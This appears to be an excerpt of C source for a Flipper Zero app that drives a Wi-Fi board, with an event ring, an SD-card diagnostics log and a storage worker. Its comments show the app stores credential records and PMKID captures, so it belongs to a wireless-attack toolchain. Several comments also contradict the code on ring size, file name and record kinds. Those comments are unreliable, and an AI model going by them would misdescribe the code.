// --- Non-blocking custom-event ring (prioritised plan, item #1) ------------------------------
// The dispatcher's own custom-event queue holds 16 entries and
// view_dispatcher_send_custom_event() waits FOREVER when it is full (furi_message_queue_put with
// FuriWaitForever + furi_check). Producers here are the 10 ms UART tick - which runs ON the
// dispatcher thread, so a full queue is a self-deadlock - and the periodic FuriTimer callbacks,
// where blocking stalls the whole timer service. So events go through this app-owned ring
// instead: producers append (never blocking, never losing the newest event) and the tick drains
// it on the GUI thread through the same scene_manager_handle_custom_event() the dispatcher uses.
// On overflow the OLDEST entry is dropped: the UI wants the newest state, and every event in the
// ring is a UI refresh or a completion the scene can re-derive.
#define POST_RING 64
static uint32_t post_ring[POST_RING];
static volatile uint8_t post_head = 0;
static volatile uint8_t post_tail = 0;
static FuriMutex* post_mutex = NULL;

// --- Diagnostics (architect design, pass 1) ---------------------------------------------------
// A preallocated binary ring of fixed-size records: diag() never allocates and never does storage
// I/O, so it is safe from the GUI thread, a timer and the storage worker alike. The storage worker
// flushes it (batched, with a periodic sync) to /ext/petrel/diag.bin, so a crash+reboot - which wipes
// the RAM log - still leaves the last records on the card. Heap figures come from the firmware's own
// counters, which is what turns "it crashed" into "the heap was already falling".
#include <furi/core/memmgr.h>
#include <furi/core/memmgr_heap.h>

// 64 records, not 256: this ring is static (.bss), and the FAP's whole budget is small - a 256-slot
// ring is 8 KB, which together with the 6 KB stack is most of the ~20 KB the device has free. The
// instrument must not become the problem it is meant to find.
#define DIAG_N 32
typedef struct {
    uint32_t seq;
    uint32_t tick;
    uint32_t kind;      // 1 tick sample, 2 post_event, 3 take_event, 4 dispatch, 5 show_result
    uint32_t a;
    uint32_t b;
    uint32_t free_now;
    uint32_t boot_min;
    uint32_t largest;
} DiagRec;
static DiagRec diag_ring[DIAG_N];
static volatile uint32_t diag_head = 0;      // next slot to write
static volatile uint32_t diag_flushed = 0;   // next slot to persist
static volatile uint32_t diag_seq = 0;
static volatile uint32_t diag_dropped = 0;
// diag() is called from the GUI, the UART worker, the timer and the storage worker, so the
// reservation and the record write need a lock: two producers could otherwise take the same slot
// and lose a head/sequence increment. SD I/O stays outside the lock (see diag_flush).
static FuriMutex* diag_mutex = NULL;

static void diag(uint32_t kind, uint32_t a, uint32_t b) {
    if(!diag_mutex) return;                 // allocated in app_alloc, freed in app_free
    furi_mutex_acquire(diag_mutex, FuriWaitForever);
    uint32_t h = diag_head;
    // The producer never moves diag_flushed (that would race the consumer's increment); the
    // consumer clamps it on overflow and counts what it had to skip. Counting here instead would
    // overcount: a record overwritten after being copied into the batch is still persisted.
    DiagRec* r = &diag_ring[h % DIAG_N];
    r->seq = ++diag_seq;
    r->tick = furi_get_tick();
    r->kind = kind;
    r->a = a;
    r->b = b;
    r->free_now = (uint32_t)memmgr_get_free_heap();
    r->boot_min = (uint32_t)memmgr_get_minimum_free_heap();
    r->largest = (uint32_t)memmgr_heap_get_max_free_block();
    diag_head = h + 1;                                // publish last
    furi_mutex_release(diag_mutex);
}

// Persist the ring to the card. Called by the storage worker (batched) and once more from app_free
// AFTER the worker has been joined: app_free used to stop the worker while the self-test's own
// completion record was still in the ring, so the record that says the run finished could be lost.
static void diag_flush(void) {
    if(!diag_mutex) return;
    // Copy a batch out under the lock, then write it with the lock released: a producer never waits
    // on the SD card.
    static DiagRec batch[8];   // small: this is BSS, the ring itself is already 2 KB
    uint32_t n = 0;
    furi_mutex_acquire(diag_mutex, FuriWaitForever);
    if(diag_head - diag_flushed > DIAG_N) {                 // skip records that were overwritten
        diag_dropped += (diag_head - diag_flushed) - DIAG_N;
        diag_flushed = diag_head - DIAG_N;
    }
    while(diag_flushed + n != diag_head && n < 8) {
        batch[n] = diag_ring[(diag_flushed + n) % DIAG_N];
        n++;
    }
    furi_mutex_release(diag_mutex);
    if(n == 0) return;
    // The batch is copied, so the SD writes happen with the lock released: a producer never waits
    // on card latency. The cursor is advanced afterwards, under the lock, by what was written.
    Storage* dst = furi_record_open(RECORD_STORAGE);
    File* df = storage_file_alloc(dst);
    if(storage_file_open(df, "/ext/petrel/diag.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
        // One fixed-width TEXT line per record: numeric IDs, written with snprintf into a stack
        // buffer, so still no allocation on any thread - and readable straight off the card with the
        // CLI, which mangles binary. Same fields as the binary record.
        char line[96];
        uint32_t written = 0;
        bool short_write = false;
        for(uint32_t i = 0; i < n; i++) {
            DiagRec* r = &batch[i];
            int w = snprintf(
                line, sizeof(line), "%lu %lu %lu %lu %lu %lu %lu %lu\n",
                (unsigned long)r->seq, (unsigned long)r->tick, (unsigned long)r->kind,
                (unsigned long)r->a, (unsigned long)r->b, (unsigned long)r->free_now,
                (unsigned long)r->boot_min, (unsigned long)r->largest);
            // A short write still counts as consumed: retrying the line would duplicate its prefix
            // (the file is append-only and cannot be truncated).
            if(storage_file_write(df, line, (size_t)w) != (size_t)w) { short_write = true; written++; break; }
            written++;
        }
        furi_mutex_acquire(diag_mutex, FuriWaitForever);
        diag_flushed += written;
        if(short_write) diag_dropped++;
        furi_mutex_release(diag_mutex);
        storage_file_sync(df);
        storage_file_close(df);
    }
    storage_file_free(df);
    furi_record_close(RECORD_STORAGE);
}

// Safe from any thread. Holds the mutex for a handful of instructions; never waits on the GUI.
static void post_event(Petrel* app, uint32_t ev) {
    diag(2, ev, 0);
    UNUSED(app);                     // kept so call sites read the same as the dispatcher API
    if(!post_mutex) return;          // allocated first in app_alloc, freed last in app_free
    furi_mutex_acquire(post_mutex, FuriWaitForever);
    uint8_t next = (uint8_t)((post_head + 1) % POST_RING);
    if(next == post_tail) post_tail = (uint8_t)((post_tail + 1) % POST_RING); // full: drop oldest
    post_ring[post_head] = ev;
    post_head = next;
    furi_mutex_release(post_mutex);
}

// --- Storage worker (prioritised plan, item #5) ----------------------------------------------
// The UART line handler runs on the GUI thread and used to write captures, credential records,
// scan results and audit/PMKID files to the SD card SYNCHRONOUSLY, from inside the tick - stalling
// input for the duration of the write, and letting the board's 127-byte UART ring overflow while
// it kept talking. Writers now serialise an immutable snapshot and hand it over; one worker thread
// does the I/O. A full queue drops the job and says so rather than blocking the GUI thread, and
// shutdown drains the queue instead of waiting on it.
#define STORAGE_Q 8
typedef struct {
    char path[160];
    char* data;      // owned by the queue, then by the worker
    size_t len;
    bool append;
} StorageJob;
static StorageJob storage_q[STORAGE_Q];
static volatile uint8_t storage_head = 0;
static volatile uint8_t storage_tail = 0;
static FuriMutex* storage_mutex = NULL;
static FuriThread* storage_thread = NULL;
static volatile bool storage_run = false;
static volatile uint16_t storage_dropped = 0;
static char storage_status[64] = "";   // last outcome, for a status screen
// Set by the worker on any failure (short write / cannot open). The GUI tick turns it into a popup:
// a failed save used to be completely silent, so the screen showed "saved" (or a frame count) while
// nothing had reached the card.
// Bumped once per FAILED write. The tick shows a popup when the number changes, so a failure that
// repeats on every keypress cannot push a scene on every tick - scene_manager_next_scene() grows the
// navigation history without a fixed depth limit, which is what produced "out of memory".
static volatile uint32_t storage_fail_seq = 0;
// Binary scan list: the board sends idx/total in every DP_SCAN_AP frame, so the GUI thread knows
// when the whole list has been parsed and can persist it without waiting for the user to open List Wifi.
static volatile uint8_t scan_expect_total = 0;

// storage_status is written by the storage/UART worker and read by the GUI tick; storage_mutex is
// only ever held for the queue, so it is free to guard this too.
#define STORAGE_STATUS(...) do { \
    furi_mutex_acquire(storage_mutex, FuriWaitForever); \
    snprintf(storage_status, sizeof(storage_status), __VA_ARGS__); \
    furi_mutex_release(storage_mutex); \
} while(0)

// Called from any thread. Takes ownership of data on success; returns false (and the caller frees)
// when the queue is full, so nothing ever blocks here.
static bool storage_submit(const char* path, char* data, size_t len, bool append) {
    if(!storage_mutex || !storage_run || !data) return false;
    diag(13, (uint32_t)len, append ? 1u : 0u);       // snapshot size offered to the worker
    bool ok = false;
    furi_mutex_acquire(storage_mutex, FuriWaitForever);
    uint8_t next = (uint8_t)((storage_head + 1) % STORAGE_Q);
    if(next != storage_tail) {
        snprintf(storage_q[storage_head].path, sizeof(storage_q[0].path), "%s", path);
        storage_q[storage_head].data = data;
        storage_q[storage_head].len = len;
        storage_q[storage_head].append = append;
        storage_head = next;
        ok = true;
    } else {
        storage_dropped++;
    }
    furi_mutex_release(storage_mutex);
    return ok;
}

